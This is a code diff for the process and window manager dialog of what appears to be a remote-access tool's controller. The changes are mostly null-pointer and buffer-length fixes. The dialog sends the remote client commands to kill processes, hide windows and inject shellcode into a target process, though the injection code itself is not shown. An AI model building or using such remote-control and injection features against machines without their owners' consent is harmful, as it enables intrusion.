@@ -102,7 +102,8 @@ struct WindowAttrs {
 };
 
 // 从末尾解析窗口属性（支持标题含 | 字符, 兼容老客户端）
-BOOL ParseWindowAttrs(const char* szData, WindowAttrs* attrs) {
+BOOL ParseWindowAttrs(const char* szData, WindowAttrs* attrs)
+{
     if (szData == NULL || attrs == NULL)
         return FALSE;
 
@@ -155,7 +156,15 @@ BOOL ParseWindowAttrs(const char* szData, WindowAttrs* attrs) {
 
 void CSystemDlg::ShowWindowsList(void)
 {
+    // GetMyBuffer(1) 深拷贝数据，跳过 TOKEN 字节
     Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
+    DWORD dwDataLength = tmp.GetBufferLength();  // 使用副本的长度
+    if (dwDataLength == 0) {
+        // 缓冲区为空，无数据可显示
+        DeleteAllItems();
+        return;
+    }
+
     char *szBuffer = tmp.c_str();
     DWORD	dwOffset = 0;
     char	*szTitle = NULL;
@@ -164,7 +173,7 @@ void CSystemDlg::ShowWindowsList(void)
     DeleteAllItems();
     CString	str;
     int i ;
-    for ( i = 0; dwOffset <m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i) {
+    for ( i = 0; dwOffset < dwDataLength; ++i) {
         LPDWORD	lpPID = LPDWORD(szBuffer + dwOffset);   //窗口句柄
         szTitle = (char *)szBuffer + dwOffset + sizeof(DWORD);   //窗口标题
         WindowAttrs attrs = {};
@@ -174,7 +183,7 @@ void CSystemDlg::ShowWindowsList(void)
         m_ControlList.InsertItem(i, str);                   // 句柄
         m_ControlList.SetItemText(i, 1, attrs.szTitle);     // 标题
         m_ControlList.SetItemText(i, 2, attrs.szStatus);    // 窗口状态
-		m_ControlList.SetItemText(i, 3, pidStr);            // 所属进程ID
+        m_ControlList.SetItemText(i, 3, pidStr);            // 所属进程ID
         // ItemData 为窗口句柄
         auto data = new ItemData{ *lpPID, {str, attrs.szTitle, attrs.szStatus, pidStr} };
         m_ControlList.SetItemData(i, (DWORD_PTR)data);  //(d)
@@ -190,7 +199,15 @@ void CSystemDlg::ShowWindowsList(void)
 
 void CSystemDlg::ShowProcessList(void)
 {
+    // GetMyBuffer(1) 深拷贝数据，跳过 TOKEN 字节
     Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(1);
+    DWORD dwDataLength = tmp.GetBufferLength();  // 使用副本的长度
+    if (dwDataLength == 0) {
+        // 缓冲区为空，无数据可显示
+        DeleteAllItems();
+        return;
+    }
+
     char	*szBuffer = tmp.c_str(); //xiaoxi[][][][][]
     const char	*szExeFile;
     const char	*szProcessFullPath;
@@ -199,7 +216,7 @@ void CSystemDlg::ShowProcessList(void)
     DeleteAllItems();
     //遍历发送来的每一个字符别忘了他的数据结构啊 Id+进程名+0+完整名+0
     int i;
-    for (i = 0; dwOffset < m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i) {
+    for (i = 0; dwOffset < dwDataLength; ++i) {
         LPDWORD	PID = LPDWORD(szBuffer + dwOffset);        //这里得到进程ID
         szExeFile = szBuffer + dwOffset + sizeof(DWORD);      //进程名就是ID之后的啦
         auto arr = StringToVector(szExeFile, ':', 2);
@@ -345,6 +362,7 @@ void CSystemDlg::OnPlistKill()
     while(Pos) {
         int	nItem = ListCtrl->GetNextSelectedItem(Pos);
         auto data = (ItemData*)ListCtrl->GetItemData(nItem);
+        if (!data) continue;
         DWORD dwProcessID = data->ID;
         memcpy(szBuffer + dwOffset, &dwProcessID, sizeof(DWORD));  //sdkfj101112
         dwOffset += sizeof(DWORD);
@@ -364,7 +382,8 @@ VOID CSystemDlg::OnPlistRefresh()
     if (m_ControlList.IsWindowVisible()) {
         DeleteAllItems();
         GetProcessList();
-        ShowProcessList();
+        // 不要在这里调用 ShowProcessList()
+        // 数据是异步返回的，由 OnReceiveComplete() 处理
     }
 }
 
@@ -417,10 +436,10 @@ void CSystemDlg::OnWlistClose()
 
     int	nItem = pListCtrl->GetSelectionMark();
     if (nItem>=0) {
-
+        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
+        if (!data) return;
         ZeroMemory(lpMsgBuf,20);
         lpMsgBuf[0]=CMD_WINDOW_CLOSE;           //注意这个就是我们的数据头
-        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID; //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));   //1 4
         m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));
@@ -436,9 +455,10 @@ void CSystemDlg::OnWlistHide()
 
     int	nItem = pListCtrl->GetSelectionMark();
     if (nItem>=0) {
+        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
+        if (!data) return;
         ZeroMemory(lpMsgBuf,20);
         lpMsgBuf[0]=CMD_WINDOW_TEST;             //窗口处理数据头
-        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;  //得到窗口的句柄一同发送
         pListCtrl->SetItemText(nItem,2,"hidden");      //注意这时将列表中的显示状态为"隐藏"
         //这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
@@ -458,9 +478,10 @@ void CSystemDlg::OnWlistRecover()
 
     int	nItem = pListCtrl->GetSelectionMark();
     if (nItem>=0) {
+        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
+        if (!data) return;
         ZeroMemory(lpMsgBuf,20);
         lpMsgBuf[0]= CMD_WINDOW_TEST;
-        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
         pListCtrl->SetItemText(nItem,2,"normal");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
@@ -479,9 +500,10 @@ void CSystemDlg::OnWlistMax()
 
     int	nItem = pListCtrl->GetSelectionMark();
     if (nItem>=0) {
+        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
+        if (!data) return;
         ZeroMemory(lpMsgBuf,20);
         lpMsgBuf[0]= CMD_WINDOW_TEST;
-        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
         pListCtrl->SetItemText(nItem,2,"maximized");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
@@ -500,9 +522,10 @@ void CSystemDlg::OnWlistMin()
 
     int	nItem = pListCtrl->GetSelectionMark();
     if (nItem>=0) {
+        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
+        if (!data) return;
         ZeroMemory(lpMsgBuf,20);
         lpMsgBuf[0]= CMD_WINDOW_TEST;
-        auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
         pListCtrl->SetItemText(nItem,2,"minimized");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
@@ -540,7 +563,7 @@ void CSystemDlg::OnPlistInject()
         MessageBoxAPI_L(m_hWnd, "只能同时向一个进程进行代码注入!", "提示", MB_ICONINFORMATION);
 
     if (MessageBoxAPI_L(m_hWnd, "确定要向目标进程 (仅限64位) 进行代码注入吗?\n此操作可能被安全软件阻止，或导致进程崩溃!",
-                     "警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
+                        "警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
         return;
 
     DWORD	dwOffset = 1, dwProcessID = 0;
@@ -548,11 +571,12 @@ void CSystemDlg::OnPlistInject()
     if (Pos) {
         int	nItem = ListCtrl->GetNextSelectedItem(Pos);
         auto data = (ItemData*)ListCtrl->GetItemData(nItem);
+        if (!data) return;
         dwProcessID = data->ID;
         dwOffset += sizeof(DWORD);
     }
     ASSERT(m_pParent);
-    m_pParent->PostMessageA(WM_INJECT_SHELLCODE, (WPARAM)new std::string(m_ContextObject->PeerName), dwProcessID);
+    m_pParent->PostMessageA(WM_INJECT_SHELLCODE, (WPARAM)new std::string(m_ContextObject->GetPeerName()), dwProcessID);
 }
 
 
@@ -568,7 +592,7 @@ void CSystemDlg::OnPlistAntiBlackScreen()
         MessageBoxAPI_L(m_hWnd, "只能同时向一个进程进行反黑屏操作!", "提示", MB_ICONINFORMATION);
 
     if (MessageBoxAPI_L(m_hWnd, "确定要向目标进程进行反黑屏吗?\n请确保目标进程、DLL及被控端架构务必相同!",
-                     "警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
+                        "警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
         return;
 
     DWORD	dwOffset = 1, dwProcessID = 0;
@@ -577,13 +601,14 @@ void CSystemDlg::OnPlistAntiBlackScreen()
     if (Pos) {
         int	nItem = ListCtrl->GetNextSelectedItem(Pos);
         auto data = (ItemData*)ListCtrl->GetItemData(nItem);
+        if (!data) return;
         dwProcessID = data->ID;
         arch = data->Arch;
         dwOffset += sizeof(DWORD);
     }
     ASSERT(m_pParent);
     char *arg = new char[300]();
-    memcpy(arg, m_ContextObject->PeerName.c_str(), m_ContextObject->PeerName.length());
+    memcpy(arg, m_ContextObject->GetPeerName().c_str(), m_ContextObject->GetPeerName().length());
     memcpy(arg + 256, arch, arch.GetLength());
     m_pParent->PostMessageA(WM_ANTI_BLACKSCREEN, (WPARAM)arg, dwProcessID);
 }
